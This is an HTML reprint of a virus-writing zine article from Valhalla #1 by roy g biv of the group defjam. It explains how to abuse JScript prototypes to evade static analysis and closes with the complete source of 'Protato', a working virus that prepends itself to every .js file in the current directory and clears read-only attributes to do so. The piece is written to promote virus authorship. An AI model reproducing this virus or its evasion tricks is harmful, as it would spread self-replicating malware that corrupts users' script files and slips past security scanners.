@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<title>Valhalla #1: JS Prototypes by roy g biv</title>
+		<meta charset="utf-8">
+		<meta name="Keywords" content="">
+		<meta name="Description" content="">
+		<link type="text/css" rel="stylesheet" href="valhalla-articles.css">
+	</head>
+	<body>
+	<h1 style="text-align:center; font-family: Verdana; font-size: 24px; color: rgb(213, 21, 199);text-shadow: 2px 2px 5px rgb(158, 34, 198);">VALHALLA Issue #1</h1>
+	<h1 style="text-align:center; font-family: Verdana; font-size: 12px; color: #ffffff"><i>2019 Re-edition</i></h1>
+	<div class="main-container-articles">
+		<pre>
+                              JScript Prototypes
+                              roy g biv / defjam
+
+                                 -= defjam =-
+                                  since 1992
+                     bringing you the viruses of tomorrow
+                                    today!
+
+
+About the author:
+
+Former  DOS/Win16  virus writer, author of several virus  families,  including
+Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
+sources  ;),  and Virus Bulletin 9/95 for a description of what   they  called
+Rainbow.   Co-author  of  world&#x27;s first virus using circular  partition  trick
+(Orsam, coded with Prototype in 1993).  Designer of world&#x27;s first XMS swapping
+virus  (John Galt, coded by RT Fishel in 1995, only 30 bytes stub, the rest is
+swapped  out).   Author of world&#x27;s first virus using Thread Local Storage  for
+replication  (Shrug, see Virus Bulletin 6/02 for a description, but they  call
+it Chiton), world&#x27;s first virus using Visual Basic 5/6 language extensions for
+replication  (OU812), world&#x27;s first Native executable virus (Chthon),  world&#x27;s
+first  virus  using process co-operation to prevent termination  (Gemini,  see
+Virus  Bulletin 9/02 for a description), world&#x27;s first virus using polymorphic
+SMTP  headers (JunkMail, see Virus Bulletin 11/02 for a description),  world&#x27;s
+first viruses that can convert any data files to infectable objects (Pretext),
+world&#x27;s  first  32/64-bit  parasitic  EPO .NET  virus  (Croissant,  see  Virus
+Bulletin  11/04  for a description, but they call it Impanate), world&#x27;s  first
+virus  using  self-executing HTML (JunkHTMaiL, see Virus Bulletin 7/03  for  a
+description), world&#x27;s first virus for Win64 on Intel Itanium (Shrug, see Virus
+Bulletin 6/04 for a description, but they call it Rugrat), world&#x27;s first virus
+for  Win64 on AMD AMD64 (Shrug), world&#x27;s first cross-infecting virus for Intel
+IA32  and  AMD  AMD64  (Shrug),  world&#x27;s  first  viruses  that  infect  Office
+applications  and  script  files  using the same  code  (Macaroni,  see  Virus
+Bulletin  11/05  for  a description, but they call it Macar),  world&#x27;s   first
+viruses  that  can infect both VBS and JScript using the same code (ACDC,  see
+Virus  Bulletin 11/05 for a description, but they call it Cada), world&#x27;s first
+virus  that  can  infect  CHM files (Charm, see Virus  Bulletin  10/06  for  a
+description,  but they call it Chamb), world&#x27;s first IDA plugin virus  (Hidan,
+see Virus Bulletin 3/07 for a description), world&#x27;s first viruses that use the
+Microsoft  Script  Encoder  to dynamically encrypt the  virus  body  (Screed),
+world&#x27;s  first virus for StarOffice and OpenOffice (Starbucks), world&#x27;s  first
+virus  IDC  virus (ID10TiC), world&#x27;s first polymorphic virus for Win64 on  AMD
+AMD64  (Boundary, see Virus Bulletin 12/06 for a description, but they call it
+Bounds),  world&#x27;s first virus that can infect Intel-format and  PowerPC-format
+Mach-O  files  (MachoMan,  see  Virus Bulletin 01/07 for  a  description,  but
+they  call  it  Macarena), world&#x27;s first virus that uses  Unicode  escapes  to
+dynamically encrypt the virus body, world&#x27;s first self-executing PIF (Spiffy),
+world&#x27;s  first  self-executing  LNK (WeakLNK), world&#x27;s first virus  that  uses
+virtual  code  (Relock, see Virus Bulletin 03/10 for a description, but   they
+call  it Lerock), world&#x27;s  first virus to use FSAVE for instruction reordering
+(Mimix,  see Virus Bulletin 01/10 for a description, but they call it Fooper),
+world&#x27;s  first  virus for ODbgScript (Volly), world&#x27;s first Hiew plugin  virus
+(Hiewg),  and world&#x27;s first virus that uses fake BOMs (Bombastic).  Author  of
+various  retrovirus  articles (eg see Vlad #7 for the strings that  make  your
+code  invisible  to TBScan).  This is my ninth virus for JScript.  It  is  the
+world&#x27;s first virus that uses JScript prototypes to run itself.
+
+
+What is a prototype?
+
+JScript  object methods use function prototypes which are the default  handler
+when  the  method  is called.  We can create new methods for some  objects  by
+declaring  a prototype with the name that we want to use.  We can also  change
+the handler for existing methods in some objects by declaring a prototype with
+the same name as that method.
+
+
+Which objects?
+
+We  can  add  and change any method for these objects: Array,  Boolean,  Date,
+Function,  Number,  Object, String.  That allows us to make a big problem  for
+static  analysis,  because the method call might run something entirely  other
+than before.
+
+
+How to change the prototype?
+
+There  are  two ways that we can change it.  One way is to declare a  function
+that will run.  The function can be anonymous, and it can do anything that the
+script can do normally.  It looks like this:
+
+    Object.prototype.bar=function(){WScript.echo(&#x22;Oops!&#x22;)}
+
+Here  I use &#x22;object&#x22; as the object, and create a new method called &#x22;bar&#x22; which
+will  display the message whenever the method is called.  To call the  method,
+we  have  to  create  a new object first, and the new  object  will  have  the
+changes, like this:
+
+    foo=new Object
+
+Then we call the method as usual:
+
+    foo.bar()
+
+and  the  message will display.  We can change an existing method in the  same
+way, like this:
+
+    Date.prototype.getYear=function(){WScript.echo(&#x22;Oops!&#x22;)}
+
+Then we create the object and call the method as usual, like this:
+
+    foo=new Date
+    foo.getYear()
+
+It  looks  like it would return the current year, but instead it displays  the
+message.   Of  course, you can pass parameters to the function if you  declare
+them to the function, like this:
+
+    String.prototype.fromCharCode=function(r){WScript.echo(r)}
+    foo=new String
+    foo.fromCharCode(&#x22;Oops!&#x22;)
+
+You  can also pass more variables than your function accepts, and they will be
+ignored, like this:
+
+    Boolean.prototype.toString=function(r){WScript.echo(r)}
+    foo=new Boolean
+    foo.toString(&#x22;Oops!&#x22;, &#x22;unused&#x22;)
+
+That helps us to make more problems for static analysis, because it is hard to
+see  which  parameters are used.  The other way to change the prototype is  to
+include  the  code  without the function declaration.  Then the code  will  be
+called during object construction and no need to call the prototype at all!
+
+    Array.prototype.r=WScript.echo(&#x22;Oops!&#x22;)
+    new Array
+
+and  the message will display.  This can execute only one command, though, but
+if  you use &#x22;eval&#x22; there, and pass your code as parameter, then you can run as
+much as you want, like this:
+
+    Array.prototype.r=eval
+    foo = new Array
+    foo.r(&#x22;WScript.echo(&#x27;Oops!&#x27;)&#x22;)
+
+Another  thing that we can do is to create a new object with a similar name to
+another  object, and create a prototype with the same name as a &#x22;safe&#x22; method.
+One  obvious choice for this is WScript.  Since JScript is case-sensitive,  we
+can  create an object called &#x22;Wscript&#x22; or &#x22;wScript&#x22; which looks similar if not
+paying  attention.  Then we can create the &#x22;echo&#x22; prototype, and it looks like
+the code will print a message, but it&#x27;s not the right one, like this:
+
+    Date.prototype.echo={WScript.echo(&#x22;Oops!&#x22;)}
+    wScript=new Date
+    wScript.echo(&#x22;unused&#x22;)
+
+Best  of all, the code that is assigned to the prototype can be read back,  so
+we  do not need to carry our own source code, like this:
+
+    Boolean.prototype.toString=function(r){WScript.echo(r)}
+    foo = new Boolean
+    WScript.echo(foo.toString)
+
+will display &#x22;function(r){WScript.echo(r)}&#x22;.
+
+Let&#x27;s see the code.
+
+Date.prototype.r=function()
+{
+  /*Protato - roy g biv 22/02/11*/
+  a=new ActiveXObject(&#x22;scripting.filesystemobject&#x22;)
+  for(b=new Enumerator(a.getfolder(&#x22;.&#x22;).files);!b.atEnd();b.moveNext())
+                                                //demo version, current directory only
+  {
+    if(a.getextensionname(c=b.item()).toLowerCase()==&#x22;js&#x22;)
+      try
+      {
+        d=a.opentextfile(c)                     //open potential victim
+        e=d.read(1)                             //read first character, keep for later
+        if(e!=&#x22;D&#x22;)                              //check for infection marker
+          try
+          {
+            e+=d.readall()                      //read entire file
+            f=c.attributes                      //save attributes
+            c.attributes=0                      //remove any read-only attribute
+            g=a.createtextfile(c)               //open file for writing
+            g.write(&#x22;Date.prototype.r=&#x22;+r.r+&#x22;;r=new Date;r.r();&#x22;+e)
+                                                //prepend to file
+            g.close()                           //close file (write mode)
+            c.attributes=f                      //restore attributes
+          }
+          catch(z)
+          {
+          }
+        d.close()                               //close file (read mode)
+      }
+      catch(z)
+      {
+      }
+  }
+}
+r=new Date
+r.r()
+
+
+Greets to friendly people (A-Z):
+
+Active - Benny - herm1t - hh86 - izee - jqwerty - Malum - Obleak - Prototype -
+Ratter - Ronin - RT Fishel - sars - SPTH - The Gingerbread Man - Ultras -
+uNdErX - Vallez - Vecna - Whitehead
+
+
+rgb/defjam feb 2011
+iam_rgb@hotmail.com
+		</pre>
+	</div>
+	</body>
+</html>
